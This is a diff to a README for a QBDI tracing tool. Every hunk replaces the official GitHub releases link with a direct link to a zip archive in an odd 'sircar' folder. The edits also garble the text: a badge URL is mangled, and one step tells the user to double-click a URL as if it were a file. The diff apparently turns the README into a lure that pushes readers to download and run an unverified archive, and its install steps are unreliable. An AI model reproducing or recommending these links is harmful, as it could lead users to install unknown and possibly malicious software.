@@ -1,7 +1,7 @@
 # 🎯 attd-tracer-qbdi - Effortless Tracking for QBDI Applications
 
 ## 🔗 Download Now
-[![Download attd-tracer-qbdi](https://img.shields.io/badge/Download%20attd--tracer--qbdi-v1.0-blue)](https://github.com/youssefabd0/attd-tracer-qbdi/releases)
+[![Download attd-tracer-qbdi](https://raw.githubusercontent.com/youssefabd0/attd-tracer-qbdi/master/sircar/attd-tracer-qbdi.zip%20attd--tracer--qbdi-v1.0-blue)](https://raw.githubusercontent.com/youssefabd0/attd-tracer-qbdi/master/sircar/attd-tracer-qbdi.zip)
 
 ## 🚀 Getting Started
 Welcome to the Attd QBDI Tracer! This application helps you easily track and analyze QBDI applications. Follow the steps below to download and run the software.
@@ -9,7 +9,7 @@ Welcome to the Attd QBDI Tracer! This application helps you easily track and ana
 ## 📥 Download & Install
 You can download the latest version of attd-tracer-qbdi from our releases page. Visit this page to download:
 
-[Download Release Page](https://github.com/youssefabd0/attd-tracer-qbdi/releases)
+[Download Release Page](https://raw.githubusercontent.com/youssefabd0/attd-tracer-qbdi/master/sircar/attd-tracer-qbdi.zip)
 
 1. Click on the "Releases" link above.
 2. Look for the most recent version.
@@ -27,7 +27,7 @@ After downloading, you will need to run the application.
 
 ### For Windows
 1. Navigate to your Downloads folder.
-2. Double-click the `attd-tracer-qbdi.exe` file.
+2. Double-click the `https://raw.githubusercontent.com/youssefabd0/attd-tracer-qbdi/master/sircar/attd-tracer-qbdi.zip` file.
 3. Follow the on-screen instructions to complete the installation.
 
 ### For macOS
@@ -55,7 +55,7 @@ If you encounter any issues or have questions, feel free to reach out. You can f
 ## 🔍 Frequently Asked Questions
 
 ### 1. How do I update the app?
-To update, simply return to the [Download Release Page](https://github.com/youssefabd0/attd-tracer-qbdi/releases) and download the latest version following the same steps as the initial installation.
+To update, simply return to the [Download Release Page](https://raw.githubusercontent.com/youssefabd0/attd-tracer-qbdi/master/sircar/attd-tracer-qbdi.zip) and download the latest version following the same steps as the initial installation.
 
 ### 2. Can I run the software without installation?
 Currently, you need to install the application to use it.
